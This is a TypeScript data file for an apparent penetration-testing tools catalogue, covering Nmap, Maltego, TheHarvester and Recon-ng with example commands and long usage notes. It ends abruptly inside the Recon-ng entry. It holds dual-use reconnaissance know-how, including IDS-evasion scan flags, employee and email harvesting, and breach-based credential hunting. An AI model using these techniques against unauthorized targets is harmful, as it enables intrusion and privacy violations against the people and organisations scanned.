
export interface Tool {
  id: string;
  name: string;
  description: string;
  category: string;
  categoryId: string;
  usage?: string;
  installation?: string;
  examples?: { title: string; code: string }[];
  documentation?: string;
  githubUrl?: string;
  tags?: string[];
  additionalInfo?: string;
}

export interface ToolCategory {
  id: string;
  name: string;
  description: string;
  tools: Tool[];
}

// Comprehensive data based on the GitHub repository structure
export const toolsCategories: ToolCategory[] = [
  {
    id: "information-gathering",
    name: "Information Gathering",
    description: "Tools for collecting data about target systems and networks to identify potential attack vectors",
    tools: [
      {
        id: "nmap",
        name: "Nmap",
        description: "Network Mapper is a free and open-source utility for network discovery and security auditing",
        category: "Information Gathering",
        categoryId: "information-gathering",
        installation: "sudo apt install nmap",
        usage: "Nmap is used to discover hosts and services on a computer network by sending packets and analyzing the responses. It can identify open ports, detect operating systems, and scan for vulnerabilities.",
        examples: [
          {
            title: "Basic scan of a target",
            code: "nmap 192.168.1.1"
          },
          {
            title: "Scan specific ports",
            code: "nmap -p 80,443 192.168.1.1"
          },
          {
            title: "Aggressive scan (OS, version, script, traceroute)",
            code: "nmap -A 192.168.1.1"
          },
          {
            title: "Stealth SYN scan",
            code: "nmap -sS 192.168.1.0/24"
          },
          {
            title: "Full port scan (all 65535 ports)",
            code: "nmap -p- 192.168.1.1"
          },
          {
            title: "Fast scan (top 100 ports)",
            code: "nmap -F 192.168.1.1"
          },
          {
            title: "UDP scan",
            code: "nmap -sU -p 53,67,161 192.168.1.1"
          },
          {
            title: "OS detection with verbosity",
            code: "nmap -O -v 192.168.1.1"
          },
          {
            title: "Service version detection with intensity",
            code: "nmap -sV --version-intensity 9 192.168.1.1"
          },
          {
            title: "Vulnerability scan using NSE scripts",
            code: "nmap --script=vuln 192.168.1.1"
          },
          {
            title: "SSL/TLS scan",
            code: "nmap --script ssl-enum-ciphers -p 443 192.168.1.1"
          },
          {
            title: "HTTP enumeration",
            code: "nmap --script=http-enum 192.168.1.1"
          },
          {
            title: "Detect firewall/IDS evasion",
            code: "nmap -f -T2 -D RND:10 192.168.1.1"
          },
          {
            title: "Save output in multiple formats",
            code: "nmap -oA scan_results 192.168.1.1"
          },
          {
            title: "Scan from file with targets",
            code: "nmap -iL targets.txt"
          },
          {
            title: "Timing template (paranoid to insane)",
            code: "nmap -T4 192.168.1.0/24"
          }
        ],
        documentation: "Nmap (Network Mapper) is the industry standard for network discovery and security auditing. Created by Gordon Lyon (Fyodor) in 1997, it has evolved into the most powerful open-source scanning tool used by millions worldwide.\n\nCore Capabilities:\n• Host Discovery: Ping sweeps using ICMP, TCP SYN, TCP ACK, UDP, ARP\n• Port Scanning: 11 different scan types (SYN, Connect, UDP, FIN, NULL, Xmas, ACK, Window, Maimon, Idle)\n• OS Fingerprinting: TCP/IP stack fingerprinting with 2,600+ OS signatures\n• Service Detection: Determines application name/version on 9,000+ services\n• Scriptable Interaction: 600+ NSE scripts for vulnerability detection, backdoor identification, network discovery\n\nAdvanced Features:\n• Timing Controls: 6 timing templates (-T0 to -T5) for speed vs stealth trade-offs\n• Firewall/IDS Evasion: Fragment packets, decoy scans, idle scans, spoofing\n• Output Formats: Normal, XML, grepable, script kiddie format\n• IPv6 Support: Full IPv6 scanning capabilities\n• SSL/TLS Analysis: Certificate validation, cipher enumeration, vulnerability checks\n\nNSE Script Categories:\n• auth: Authentication testing\n• broadcast: Network broadcast discovery\n• brute: Brute force attacks\n• default: Default safe scripts\n• discovery: Network/service discovery\n• dos: Denial of service testing\n• exploit: Exploit known vulnerabilities\n• external: Use external resources\n• fuzzer: Fuzzing attacks\n• intrusive: Intrusive tests\n• malware: Malware detection\n• safe: Safe for production\n• version: Enhanced version detection\n• vuln: Vulnerability detection\n\nIndustry Applications:\n• Penetration Testing: Initial reconnaissance and vulnerability assessment\n• Network Inventory: Asset management and network mapping\n• Compliance Auditing: PCI DSS, HIPAA, SOX compliance scanning\n• Incident Response: Forensics and malware detection\n• Security Research: Discovering zero-days and analyzing attack surfaces\n\nPerformance Optimization:\n• Parallel Scanning: Scan multiple hosts simultaneously\n• Rate Limiting: Control scan speed to avoid detection\n• Host Groups: Efficient scanning of large networks\n• Resume Scans: Continue interrupted scans with --resume\n\nBest Practices:\n• Always get written permission before scanning\n• Use -T3 or -T4 for balanced speed/accuracy\n• Combine -sV with --version-light for faster service detection\n• Use --top-ports for quick reconnaissance\n• Enable -v or -vv for real-time feedback\n• Save results with -oA for all formats\n\nCommon Pitfalls:\n• Avoid -T5 (insane) - causes packet loss and missed services\n• UDP scans (-sU) are slow but critical for full assessment\n• Firewalls may block ICMP, use -Pn to skip host discovery\n• Service version detection (-sV) significantly increases scan time\n• NSE scripts can be intrusive - read documentation first",

        githubUrl: "https://github.com/nmap/nmap",
        tags: ["network", "scanner", "reconnaissance", "port scanner"],
        additionalInfo: "Nmap was originally written by Gordon Lyon (also known as Fyodor Vaskovich) and is now maintained by a community of developers. It's available for most operating systems including Windows, macOS, and Linux distributions."
      },
      {
        id: "maltego",
        name: "Maltego",
        description: "Open source intelligence and forensics application, used for gathering and connecting information for visual link analysis",
        category: "Information Gathering",
        categoryId: "information-gathering",
        usage: "Maltego is used for open-source intelligence and forensics to determine the relationships and connections between people, groups, websites, domains, and more. It presents information as nodes on a graph for easy visualization of complex networks.",
        installation: "sudo apt install maltego",
        examples: [
          {
            title: "Launch Maltego",
            code: "maltego"
          },
          {
            title: "Create new graph",
            code: "File > New > Graph"
          },
          {
            title: "Add domain entity",
            code: "Drag 'Domain' from entity palette onto graph"
          },
          {
            title: "Run transform on entity",
            code: "Right-click entity > Run Transform > Select transform"
          },
          {
            title: "To DNS from Domain",
            code: "Right-click Domain > Run Transform > To DNS Name"
          },
          {
            title: "To IP Address from DNS",
            code: "Right-click DNS Name > Run Transform > To IP Address"
          },
          {
            title: "Email addresses from domain",
            code: "Right-click Domain > Run Transform > Email addresses from domain"
          },
          {
            title: "Run all transforms",
            code: "Right-click entity > Run All Transforms"
          },
          {
            title: "Person to phone numbers",
            code: "Right-click Person > Run Transform > Phone Numbers"
          },
          {
            title: "Social media discovery",
            code: "Right-click Person > Run Transform > Facebook/Twitter/LinkedIn profiles"
          },
          {
            title: "Company to employees",
            code: "Right-click Company > Run Transform > Employees"
          },
          {
            title: "Whois information",
            code: "Right-click Domain > Run Transform > Whois Information"
          },
          {
            title: "Create machine (automation)",
            code: "Select entities > Machines > Create Machine"
          },
          {
            title: "Export graph to image",
            code: "File > Export > Graph to Image"
          },
          {
            title: "Import CSV data",
            code: "Import > CSV File > Map columns to entities"
          },
          {
            title: "Use TDS (Transform Distribution Server)",
            code: "Transform Hub > Install Transforms from TDS"
          }
        ],
        documentation: "Maltego is an industry-standard interactive data mining and link analysis application developed by Paterva (now part of Maltego Technologies). Used extensively by security professionals, investigators, and analysts worldwide, it excels at demonstrating complexity and relationships in data gathered from diverse sources. The platform transforms OSINT into actionable intelligence through visual graph-based analysis.\n\nCore Concepts:\n• Entities: Data objects (Person, Domain, Email, IP, Phone, etc.)\n• Transforms: Data gathering operations on entities\n• Graph: Visual representation of relationships\n• Machines: Automated transform workflows\n• TDS: Transform Distribution Server (API integration)\n• Canari: Transform development framework\n• Collaboration: Team sharing and investigation\n\nEditions:\n• Community Edition (CE): Free, limited transforms\n• Classic: Desktop version with more transforms\n• XL: Advanced features, more API integrations\n• Enterprise: Team collaboration, case management\n• CTAS: Cyber Threat Analysis Suite\n• Maltego Carbon: High-performance version\n\nEntity Types (100+):\n• Infrastructure:\n  • Domain, DNS Name, IP Address, Netblock\n  • AS (Autonomous System), MX Record\n  • URL, Website, Banner\n• People:\n  • Person, Alias, Email Address\n  • Phone Number, Document\n• Social Media:\n  • Facebook, Twitter, LinkedIn profiles\n  • Instagram, YouTube channels\n• Location:\n  • Physical Address, GPS Coordinates\n  • Country, City\n• Organizations:\n  • Company, Organization\n• Custom: Create your own entity types\n\nTransforms:\n• Definition: Operations that discover relationships\n• Execution: Right-click entity > Run Transform\n• Types:\n  • Local: Run on your machine\n  • Remote: API-based (require keys)\n  • Custom: Developed with Canari/TRX\n• Categories:\n  • DNS: Resolution, reverse lookup\n  • WHOIS: Domain registration data\n  • Search: Google, Bing, social media\n  • Geolocation: IP to location\n  • Social: Profile discovery\n  • Infrastructure: Network mapping\n\nBuilt-in Transform Sets:\n• Paterva CTAS: Cyber threat transforms\n• VirusTotal Public API: Threat intelligence\n• PassiveTotal: Domain/IP enrichment\n• Have I Been Pwned: Breach checking\n• Shodan: Internet-wide scanning data\n• Farsight DNSDB: DNS intelligence\n• AlienVault OTX: Open threat exchange\n• CaseFile: Offline investigation tool\n\nTransform Hub:\n• Centralized transform marketplace\n• Install/Manage transforms\n• Free and commercial transforms\n• Configuration: API keys, settings\n• Updates: Automatic transform updates\n• Browse categories:\n  • Threat Intelligence\n  • Social Media\n  • Infrastructure\n  • Dark Web\n  • Financial\n\nGraph Operations:\n• Layout Algorithms:\n  • Hierarchical: Tree structure\n  • Circular: Ring arrangement\n  • Organic: Natural clustering\n  • Grid: Structured layout\n  • Block: Group-based\n• Selection: Entities and links\n• Filtering: Hide/show by type\n• Grouping: Organize entities\n• Annotations: Add notes\n• Properties: View/edit entity data\n\nMachines (Automation):\n• Purpose: Automated multi-step investigations\n• Creation: Record transform sequences\n• Execution: One-click complex workflows\n• Use Cases:\n  • Company footprint discovery\n  • Person investigation\n  • Domain infrastructure mapping\n  • Email verification\n• Built-in Machines:\n  • Company Stalker: Full company recon\n  • Footprint L1/L2/L3: Progressive depth\n  • Person Search: Multi-source lookup\n• Custom: Build your own machines\n\nData Management:\n• Import:\n  • CSV: Bulk entity import\n  • Excel: Spreadsheet data\n  • XML: Maltego graph format\n  • JSON: API responses\n• Export:\n  • Images: PNG, JPEG\n  • PDF: Reports\n  • CSV: Entity lists\n  • GraphML: Graph format\n  • XLSX: Excel spreadsheet\n• Copy/Paste: Between graphs\n\nCollaboration (Enterprise):\n• Shared Graphs: Team investigation\n• Real-time Updates: Live collaboration\n• Case Management: Organize projects\n• Access Control: User permissions\n• Audit Trail: Activity logging\n• Version Control: Graph history\n\nVisualization Features:\n• Entity Icons: Visual identification\n• Link Labels: Relationship types\n• Color Coding: Category distinction\n• Size Scaling: Importance weighting\n• Bookmarks: Save graph states\n• Detail View: Entity properties panel\n• Overview Pane: Navigation\n• Property Editor: Modify data\n\nInvestigation Workflows:\n• Domain Investigation:\n  1. Add domain entity\n  2. DNS records\n  3. WHOIS data\n  4. IP addresses\n  5. Related domains\n  6. Hosting infrastructure\n• Person Investigation:\n  1. Add person entity\n  2. Email addresses\n  3. Social media profiles\n  4. Phone numbers\n  5. Associated persons\n  6. Organizations\n• Company Research:\n  1. Add company entity\n  2. Employees (LinkedIn)\n  3. Infrastructure (domains/IPs)\n  4. Social media presence\n  5. Related companies\n  6. Contact information\n\nAdvanced Features:\n• Scripting: Python automation\n• API: RESTful integration\n• Custom Entities: Define new types\n• Transform Development: Canari framework\n• Database Integration: SQL queries\n• Network Graphing: Visual analytics\n• Timeline View: Temporal analysis\n• Geo-mapping: Location visualization\n\nTransform Development:\n• Canari Framework: Python-based\n• TRX (Transform Exchange): Simple API\n• Local Transforms: Run on machine\n• Remote Transforms: API integration\n• Input: Entity type and properties\n• Output: New entities and relationships\n• Testing: Maltego IDE\n\nAPI Integration:\n• Common APIs:\n  • Shodan: Device discovery\n  • VirusTotal: Threat intelligence\n  • PassiveTotal: DNS/IP data\n  • Have I Been Pwned: Breach data\n  • FullContact: People/company data\n  • Clearbit: Business intelligence\n  • Hunter.io: Email discovery\n• Authentication: API keys\n• Rate Limits: Service-dependent\n• Cost: Free tiers available\n\nUse Cases:\n• Penetration Testing: Reconnaissance phase\n• Threat Intelligence: Adversary mapping\n• Fraud Investigation: Connection discovery\n• Law Enforcement: Criminal investigations\n• Cyber Investigations: Incident analysis\n• Due Diligence: Background checks\n• Brand Protection: Impersonation detection\n• Risk Assessment: Third-party analysis\n• Dark Web Monitoring: Threat tracking\n\nOSINT Sources:\n• Search Engines: Google, Bing, Baidu\n• Social Media: Facebook, Twitter, LinkedIn\n• DNS: Resolution, reverse lookup\n• WHOIS: Domain registration\n• Certificate Transparency: SSL certificates\n• Shodan: Internet-wide scanning\n• Breach Databases: Leaked credentials\n• Public Records: Government databases\n• Dark Web: Tor sites, forums\n\nBest Practices:\n• Start Simple: Single entity, basic transforms\n• Progressive Depth: Layer by layer\n• API Keys: Configure for better results\n• Save Often: Graphs can be complex\n• Use Machines: Automate common tasks\n• Organize: Use groups and bookmarks\n• Document: Annotate findings\n• Validate: Verify discovered data\n• Legal Awareness: Stay within bounds\n• Data Protection: Handle PII securely\n\nPerformance Tips:\n• Limit Transform Results: Set reasonable limits\n• Progressive Expansion: Don't run all at once\n• Archive Old Graphs: Reduce memory use\n• Selective Transforms: Choose relevant ones\n• Use Filters: Hide unnecessary entities\n• Memory: Increase Java heap size\n• Updates: Keep transforms current\n\nLimitations:\n• API Dependent: Best results need keys\n• Data Quality: Varies by source\n• Rate Limits: Service restrictions\n• Public Data: Limited to OSINT\n• Cost: Premium features require license\n• Learning Curve: Complex for beginners\n• Graph Complexity: Can become unwieldy\n\nCommon Pitfalls:\n• No API Keys: Missing critical data\n• Transform Overload: Running too many\n• Not Validating: Trusting all results\n• Poor Organization: Chaotic graphs\n• Ignoring Privacy: PII exposure\n• No Documentation: Lost context\n• Scope Creep: Unauthorized targets\n\nIntegration:\n• CaseFile: Offline analysis\n• Metasploit: Import targets\n• Recon-ng: Complementary framework\n• TheHarvester: Feed entity data\n• Spiderfoot: Compare results\n• SIEM: Threat intelligence feed\n• Custom Tools: API integration\n\nReporting:\n• Screenshots: Export images\n• PDF Reports: Professional output\n• Executive Summary: High-level findings\n• Technical Details: Entity properties\n• Relationship Diagrams: Key connections\n• Timeline: Temporal analysis\n• Recommendations: Actionable advice\n\nReal-World Applications:\n• APT Investigation: Map threat actor infrastructure\n• Phishing Analysis: Trace campaign origins\n• Fraud Detection: Uncover criminal networks\n• IP Theft: Identify data leakers\n• M&A Due Diligence: Company background\n• Insider Threats: Connection analysis\n• Supply Chain Security: Third-party risks\n• Brand Monitoring: Impersonation detection\n\nLegal and Ethical:\n• Authorization: Permission for investigations\n• Public Data: OSINT only\n• Privacy: Handle PII responsibly\n• Jurisdiction: Follow local laws\n• Documentation: Record data sources\n• Responsible Use: Ethical purposes\n• Data Retention: Secure storage/disposal\n• Compliance: GDPR, CCPA awareness",
        githubUrl: "https://github.com/paterva/maltego-trx",
        tags: ["OSINT", "visualization", "reconnaissance", "forensics"],
        additionalInfo: "Maltego is developed by Paterva and is available in both free Community Edition and commercial versions. It's widely used by security researchers, private investigators, and law enforcement agencies."
      },
      {
        id: "the-harvester",
        name: "TheHarvester",
        description: "Tool for gathering e-mail accounts, subdomain names, virtual hosts, open ports, and banners from different public sources",
        category: "Information Gathering",
        categoryId: "information-gathering",
        installation: "sudo apt install theharvester",
        usage: "TheHarvester is used to gather open source intelligence (OSINT) on a company or domain by extracting information from various public sources",
        examples: [
          {
            title: "Basic domain scan (all sources)",
            code: "theharvester -d example.com -l 500 -b all"
          },
          {
            title: "Google search for emails and hosts",
            code: "theharvester -d example.com -l 200 -b google"
          },
          {
            title: "LinkedIn employee enumeration",
            code: "theharvester -d example.com -l 100 -b linkedin"
          },
          {
            title: "Search multiple sources",
            code: "theharvester -d example.com -b google,bing,yahoo,duckduckgo"
          },
          {
            title: "SHODAN integration (requires API key)",
            code: "theharvester -d example.com -b shodan"
          },
          {
            title: "DNS brute force with wordlist",
            code: "theharvester -d example.com -b dnsdumpster -c"
          },
          {
            title: "Save results to JSON",
            code: "theharvester -d example.com -b all -f results.json"
          },
          {
            title: "Save results to HTML report",
            code: "theharvester -d example.com -b all -f results.html"
          },
          {
            title: "Search with virtual host verification",
            code: "theharvester -d example.com -v -b google"
          },
          {
            title: "Port scanning discovered hosts",
            code: "theharvester -d example.com -b all -p"
          },
          {
            title: "Search with screenshots",
            code: "theharvester -d example.com -b all -s"
          },
          {
            title: "Twitter username search",
            code: "theharvester -d example.com -b twitter"
          },
          {
            title: "Certificate transparency search",
            code: "theharvester -d example.com -b certspotter,crtsh"
          },
          {
            title: "Subdomain takeover detection",
            code: "theharvester -d example.com -b all -t"
          },
          {
            title: "DNS records with TLD expansion",
            code: "theharvester -d example.com -b all -n"
          }
        ],
        documentation: "TheHarvester is a powerful OSINT (Open Source Intelligence) tool created by Christian Martorella and maintained by Laramies. Used in the reconnaissance phase of penetration testing, it aggregates publicly available information about targets from multiple sources, making it essential for security assessments and threat intelligence.\n\nSupported Data Sources:\n• Search Engines: Google, Bing, Yahoo, DuckDuckGo, Baidu\n• Social Media: LinkedIn, Twitter\n• Certificate Transparency: CrtSh, Certspotter\n• DNS Services: DNSDumpster, ThreatCrowd\n• Search APIs: Shodan, Censys, SecurityTrails\n• PGP Servers: Key servers for email addresses\n• Threat Intelligence: VirusTotal, ThreatMiner\n• Other: Hunter.io, GitHub, Netcraft\n\nInformation Gathered:\n• Email Addresses: Employees, contacts, distribution lists\n• Subdomains: Complete subdomain enumeration\n• Virtual Hosts: Vhosts sharing same IP\n• IP Addresses: Associated IPs and ranges\n• URLs: Discovered pages and endpoints\n• Names: Employee and personnel names\n• Open Ports: Port scan results (with -p)\n• Banners: Service identification\n• ASN: Autonomous System Numbers\n\nCore Functionality:\n• Passive Reconnaissance: No direct target interaction\n• Multiple Sources: Aggregate from 20+ sources\n• API Integration: Leverage commercial APIs\n• DNS Operations: Resolution and brute forcing\n• Port Scanning: Basic port enumeration\n• Virtual Host Discovery: Identify shared hosting\n• Screenshot Capture: Visual reconnaissance\n• Export Formats: JSON, XML, HTML, CSV\n\nSearch Engines Module:\n• Google: Most comprehensive results\n• Bing: Microsoft search index\n• Yahoo: Alternative results\n• DuckDuckGo: Privacy-focused search\n• Baidu: Chinese search engine\n• Technique: Dorking and scraping\n• Rate Limits: Automatic throttling\n• User-Agent Rotation: Avoid blocking\n\nSocial Media Intelligence:\n• LinkedIn:\n  • Employee enumeration\n  • Job titles and roles\n  • Company structure\n  • Skills and technologies\n  • Rate limits apply\n• Twitter:\n  • Public mentions\n  • Associated accounts\n  • Brand monitoring\n\nCertificate Transparency:\n• CrtSh: Certificate search\n• Certspotter: CT log monitor\n• Benefits:\n  • Historical subdomains\n  • Wildcard certificates\n  • Infrastructure discovery\n  • No rate limits\n  • Passive technique\n\nDNS Enumeration:\n• DNSDumpster: Visual DNS mapper\n• ThreatCrowd: Community threat data\n• DNS Brute Force: -c flag with wordlist\n• Records: A, AAAA, MX, NS, TXT\n• Zone Transfers: Automatic detection\n• Wildcard Detection: Identify wildcards\n\nShodan Integration:\n• Requirements: API key required\n• Information: Open ports, services, banners\n• Coverage: Internet-wide scanning data\n• Historical Data: Previous scans\n• Vulnerabilities: Known CVEs\n• Industrial: ICS/SCADA detection\n• Cost: Credits per query\n\nAdvanced Features:\n• Virtual Host Verification (-v):\n  • Confirm vhost responds\n  • HTTP request validation\n  • Eliminate false positives\n• Port Scanning (-p):\n  • Scan discovered hosts\n  • Common ports (80, 443, 22, etc.)\n  • Service detection\n• Screenshots (-s):\n  • Capture web pages\n  • Visual intelligence\n  • Requires dependencies\n• Takeover Detection (-t):\n  • Subdomain takeover checks\n  • Dangling DNS records\n  • Cloud service detection\n\nOutput Formats:\n• JSON: Machine-readable, API-friendly\n• XML: Structured data export\n• HTML: Human-readable report\n• CSV: Spreadsheet compatible\n• Console: Real-time display\n• Integration: Import to other tools\n\nAPI Key Configuration:\n• File Location: ~/.theHarvester/api-keys.yaml\n• Supported APIs:\n  • Shodan: shodan_key\n  • Censys: censys_id, censys_secret\n  • SecurityTrails: securitytrails_key\n  • Hunter: hunter_key\n  • VirusTotal: virustotal_key\n• Free Tiers: Most APIs offer limited free access\n• Rate Limits: Vary by service\n\nDNS Brute Force:\n• Wordlists: Built-in subdomains list\n• Custom Lists: Use your own wordlist\n• Technique: Resolve with DNS queries\n• Speed: Parallel resolution\n• Verification: Confirm valid responses\n• Common Subdomains: www, mail, ftp, admin, etc.\n\nBest Practices:\n• Legal Authorization: Only scan authorized targets\n• Multiple Sources: Use -b all for coverage\n• API Keys: Configure for better results\n• Rate Limiting: Don't overwhelm sources\n• Results Validation: Verify discoveries\n• Export Results: Save for documentation\n• Combine Tools: Use with other OSINT tools\n• Regular Updates: Keep tool current\n• Privacy: Be aware of source TOS\n\nCommon Use Cases:\n• Penetration Testing: Initial reconnaissance\n• Bug Bounty: Scope discovery\n• Threat Intelligence: Infrastructure mapping\n• Brand Monitoring: Digital footprint\n• Merger & Acquisition: Due diligence\n• OSINT Investigations: Background research\n• Asset Discovery: Shadow IT identification\n• Security Audits: External exposure assessment\n\nIntegration:\n• Maltego: Import for visualization\n• Recon-ng: Complementary framework\n• Amass: Subdomain enumeration\n• Spiderfoot: OSINT automation\n• Metasploit: Feed target information\n• Nmap: Port scan discovered hosts\n• Custom Scripts: Parse JSON output\n\nLimitations:\n• Passive Only: No active scanning (by default)\n• API Dependent: Best results need keys\n• Rate Limits: Source-imposed restrictions\n• Outdated Data: Cached/historical info\n• False Positives: Requires verification\n• Public Data: Only publicly available info\n• Legal: Respect TOS of sources\n\nCommon Pitfalls:\n• No API Keys: Missing premium results\n• Rate Limiting: Getting blocked\n• Outdated Info: Not verifying results\n• Too Aggressive: Overloading sources\n• No Documentation: Not saving results\n• Single Source: Limited data\n• TOS Violations: Ignoring service terms\n\nPerformance Tips:\n• Limit Results: Use -l for large targets\n• Specific Sources: Target relevant sources\n• API Keys: Significantly improve results\n• Parallel Processing: Built-in concurrency\n• Caching: Results stored during run\n• Network: Good connection required\n\nReal-World Applications:\n• External Perimeter Mapping: Identify all assets\n• Email Address Collection: Phishing simulations\n• Subdomain Discovery: Find hidden services\n• Technology Stack: Identify infrastructure\n• Personnel Intelligence: Social engineering prep\n• Supply Chain Analysis: Third-party exposure\n• Competitive Intelligence: Market research\n• Compliance: External exposure audit\n\nPrivacy and Ethics:\n• Public Information: Uses publicly available data\n• No Hacking: Pure OSINT, no exploitation\n• Authorization: Get permission for testing\n• Responsible Use: Don't abuse sources\n• Data Handling: Secure sensitive findings\n• Legal Compliance: Follow local laws\n• Source TOS: Respect service terms",
        githubUrl: "https://github.com/laramies/theHarvester",
        tags: ["OSINT", "email", "subdomain", "reconnaissance"]
      },
      {
        id: "recon-ng",
        name: "Recon-ng",
        description: "Full-featured reconnaissance framework designed with a modular approach for web-based open source reconnaissance",
        category: "Information Gathering",
        categoryId: "information-gathering",
        installation: "sudo apt install recon-ng",
        usage: "Recon-ng provides a powerful environment to conduct open source web-based reconnaissance quickly and thoroughly",
        examples: [
          {
            title: "Start Recon-ng",
            code: "recon-ng"
          },
          {
            title: "Create new workspace",
            code: "workspaces create CompanyName"
          },
          {
            title: "Add domain to database",
            code: "db insert domains example.com"
          },
          {
            title: "Search for modules",
            code: "modules search domains"
          },
          {
            title: "Install module from marketplace",
            code: "marketplace install recon/domains-hosts/hackertarget"
          },
          {
            title: "Load and run Google site search",
            code: "modules load recon/domains-hosts/google_site_web\noptions set SOURCE example.com\nrun"
          },
          {
            title: "Subdomain brute force",
            code: "modules load recon/domains-hosts/brute_hosts\nrun"
          },
          {
            title: "Email harvesting",
            code: "modules load recon/domains-contacts/hunter_io\nrun"
          },
          {
            title: "Reverse IP lookup",
            code: "modules load recon/hosts-hosts/reverse_resolve\nrun"
          },
          {
            title: "Shodan host lookup",
            code: "modules load recon/hosts-ports/shodan_ip\nkeys add shodan_api YOUR_API_KEY\nrun"
          },
          {
            title: "Show database contents",
            code: "show hosts\nshow contacts\nshow credentials"
          },
          {
            title: "Export results to CSV",
            code: "modules load reporting/csv\nrun"
          },
          {
            title: "Generate HTML report",
            code: "modules load reporting/html\noptions set FILENAME report.html\nrun"
          },
          {
            title: "Run script/automation",
            code: "recon-ng -w workspace_name -r script.resource"
          }
        ],
        documentation: "Recon-ng is a powerful reconnaissance framework created by Tim Tomes (LaNMaSteR53). Designed with a Metasploit-like interface, it provides a modular approach to OSINT gathering with a consistent workflow. Written in Python, it features an extensive marketplace of modules, database integration, and comprehensive reporting capabilities.\n\nCore Architecture:\n• Workspaces: Isolated project environments\n• Modules: Plugin-based functionality (100+)\n• Database: SQLite backend for data storage\n• Marketplace: Centralized module repository\n• API Keys: Secure credential management\n• Reporting: Multiple output formats\n• Scripting: Resource file automation\n\nWorkspace Management:\n• Create: workspaces create <name>\n• List: workspaces list\n• Select: workspaces select <name>\n• Delete: workspaces delete <name>\n• Isolation: Separate database per workspace\n• Naming: Organize by target/client\n• Snapshots: Database backups\n\nDatabase Tables:\n• Domains: Target domains\n• Hosts: Discovered IP addresses\n• Contacts: Email addresses, names\n• Credentials: Username/password pairs\n• Leaks: Data breach information\n• Ports: Open ports and services\n• Profiles: Social media accounts\n• Repositories: Code repositories\n• Vulnerabilities: Known vulnerabilities\n\nModule Categories:\n• Recon: Information gathering\n  • domains-*: Domain reconnaissance\n  • hosts-*: Host discovery\n  • contacts-*: Contact information\n  • companies-*: Company research\n• Discovery: Active scanning\n• Exploitation: Limited exploit modules\n• Import: Data import from other tools\n• Reporting: Export and visualization\n\nModule Naming Convention:\n• Format: category/input-output/module_name\n• Input: Data type consumed (domains, hosts)\n• Output: Data type produced (hosts, contacts)\n• Examples:\n  • recon/domains-hosts/: Domain to host mapping\n  • recon/hosts-ports/: Host to port scanning\n  • recon/contacts-profiles/: Contact to social profiles\n\nMarketplace:\n• Browse: marketplace search\n• Info: marketplace info <module>\n• Install: marketplace install <module>\n• Remove: marketplace remove <module>\n• Refresh: marketplace refresh\n• Updates: Check for module updates\n• Dependencies: Auto-install requirements\n\nPopular Modules:\n• recon/domains-hosts/hackertarget: Free subdomain lookup\n• recon/domains-hosts/google_site_web: Google dorking\n• recon/domains-contacts/hunter_io: Email enumeration\n• recon/domains-contacts/whois_pocs: WHOIS contacts\n• recon/hosts-hosts/resolve: DNS resolution\n• recon/hosts-ports/shodan_ip: Shodan integration\n• recon/contacts-profiles/fullcontact: Social profiles\n• discovery/info_disclosure/interesting_files: File discovery\n\nAPI Key Management:\n• Add: keys add <service> <key>\n• List: keys list\n• Remove: keys remove <service>\n• Services: Shodan, Hunter.io, FullContact, etc.\n• Storage: Encrypted in database\n• Free Tiers: Many services offer free keys\n• Required: Some modules need API keys\n\nSupported APIs:\n• Shodan: Internet-wide scanning data\n• Hunter.io: Email address discovery\n• Have I Been Pwned: Breach checking\n• FullContact: People and company data\n• Censys: Certificate and host data\n• SecurityTrails: DNS history\n• VirusTotal: Threat intelligence\n• GitHub: Code repository search\n• Twitter: Social media intelligence\n\nModule Workflow:\n1. Load: modules load <path>\n2. Info: info (show module details)\n3. Options: options list\n4. Set: options set <name> <value>\n5. Run: run\n6. Results: Automatically stored in DB\n\nOptions Configuration:\n• SOURCE: Input data (e.g., domain)\n• MODULE options: Module-specific settings\n• Global options: Apply to all modules\n• Required: Must set before running\n• Defaults: Some have default values\n• Validation: Auto-check before run\n\nDatabase Operations:\n• Insert: db insert <table> <value>\n• Query: db query <SQL>\n• Schema: db schema\n• Export: show <table>\n• Delete: db delete <table> <rowid>\n• Backup: Workspace snapshots\n\nQuery Commands:\n• show domains: List all domains\n• show hosts: List discovered hosts\n• show contacts: Email addresses\n• show credentials: Found credentials\n• show ports: Open ports\n• show profiles: Social media profiles\n• show companies: Company information\n• show vulnerabilities: Known vulns\n\nReporting Modules:\n• reporting/csv: CSV export\n• reporting/html: HTML report\n• reporting/json: JSON format\n• reporting/list: Plain text lists\n• reporting/xlsx: Excel spreadsheet\n• reporting/xml: XML format\n• Custom: Build your own reporter\n\nResource Scripts (.resource):\n• Automation: Batch module execution\n• Format: One command per line\n• Comments: # for comments\n• Execution: recon-ng -r script.resource\n• Use Cases: Repeatable workflows\n• Example:\n  workspaces create target\n  db insert domains example.com\n  modules load recon/domains-hosts/hackertarget\n  run\n\nAdvanced Features:\n• Snapshots: Workspace state saving\n• Global Options: Set once, use everywhere\n• Module Chaining: Output becomes input\n• Custom Modules: Write your own\n• Verbosity: Control output detail\n• Proxy Support: Route through proxy\n• Dashboard: Web-based interface\n\nCustom Module Development:\n• Language: Python\n• Base Class: Inherit from module class\n• Methods: module_pre(), module_run()\n• Meta: Define inputs/outputs\n• Options: Declare required options\n• Location: ~/.recon-ng/modules/custom/\n• Documentation: Inline docstrings\n\nBest Practices:\n• Workspaces: One per target/client\n• API Keys: Configure for better results\n• Module Selection: Choose relevant modules\n• Validate Results: Verify discoveries\n• Documentation: Export reports regularly\n• Database Queries: Leverage SQL power\n• Resource Scripts: Automate common tasks\n• Updates: Keep modules current\n• Scope: Stay within authorization\n\nCommon Workflows:\n• Initial Recon:\n  1. Create workspace\n  2. Add seed domains\n  3. Run subdomain enumeration\n  4. Resolve hosts\n  5. Port scan\n  6. Generate report\n• Email Harvesting:\n  1. Insert domain\n  2. Run contact modules\n  3. Breach checking\n  4. Profile discovery\n  5. Export contacts\n• Credential Hunting:\n  1. Enumerate emails\n  2. Check breaches (HIBP)\n  3. Query paste sites\n  4. Correlate credentials\n\nIntegration:\n• Maltego: Export for visualization\n• Metasploit: Import hosts/services\n• TheHarvester: Complementary OSINT\n• Spiderfoot: Compare results\n• SIEM: Feed threat intelligence\n• Custom Scripts: Parse JSON exports\n\nLimitations:\n• API Dependent: Best results need keys\n• Rate Limits: Source restrictions\n• Module Quality: Varies by author\n• Maintenance: Some modules outdated\n• Active Scanning: Limited compared to Nmap\n• GUI: Command-line only (web dashboard experimental)\n\nCommon Pitfalls:\n• No API Keys: Missing functionality\n• Wrong Workspace: Data in wrong place\n• Module Errors: Missing dependencies\n• Database: Forgetting to check results\n• Source Verification: Not validating data\n• Scope Creep: Scanning unauthorized 